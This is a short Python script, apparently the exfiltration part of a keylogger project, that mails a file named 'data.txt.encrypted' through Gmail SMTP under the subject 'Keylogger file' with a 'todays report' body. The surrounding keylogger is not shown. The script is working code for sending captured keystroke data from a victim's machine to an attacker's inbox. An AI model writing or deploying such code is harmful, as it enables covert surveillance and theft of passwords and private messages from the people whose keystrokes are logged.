import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

email_user = input("Enter your Gmail email address: ")
email_password = input("Enter your Gmail password: ")
email_send = input("Enter the recipient email address: ")
subject = 'Keylogger file'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject
body = 'Here its todays report!!!!!!!!!!'
msg.attach(MIMEText(body,'plain'))

filename='data.txt.encrypted'
attachment  = open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email_user, email_password)

server.sendmail(email_user, email_send, text)
server.quit()
